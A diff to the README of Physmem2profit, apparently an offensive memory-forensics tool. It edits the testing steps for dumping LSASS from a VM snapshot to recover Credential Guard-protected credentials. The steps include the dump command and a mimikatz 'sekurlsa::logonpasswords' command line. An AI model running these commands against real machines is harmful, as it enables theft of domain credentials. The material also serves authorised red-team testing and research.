@@ -47,12 +47,12 @@ Decrypting credentials protected by Credential Guard requires gaining access to 
 
 ### Testing
 
-1. Login to the virtual machine (with a domain account)
+1. Log in to the virtual machine (with a domain account)
 1. Take a snapshot
-1. Copy the .vmem file and the .vmsn file. Copy/rename the .vmsn file to .vmss, otherwise Rekall will not be able to parse the .vmem correctly
-1. ```python3 physmem2profit --mode dump --vmem /tmp/Win10-Snapshot1.vmem --label credential-guard-test```
+1. Run Physmem2profit against the .vmem file: ```python3 physmem2profit --mode dump --vmem /tmp/Win10-Snapshot1.vmem --label credential-guard-test```
     * This will write the LSASS minidump to `output/[label]-[date]-lsass.dmp`. The minidump contains a special stream that holds the data from the Secure World, allowing Mimikatz to locate the encryption key.
     * The Secure World data is also stored to `output/[label]-[date]-secure-world.raw`.
+    * If Rekall has problems parsing the .vmem file, Physmem2profit will recommend you to copy the .vmsn file and rename it to .vmss
 1. Copy the minidump to a Windows system and run `mimikatz.exe "sekurlsa::minidump [label]-[date]-lsass.dmp" "sekurlsa::logonpasswords" "exit"`
 
 ### Future work
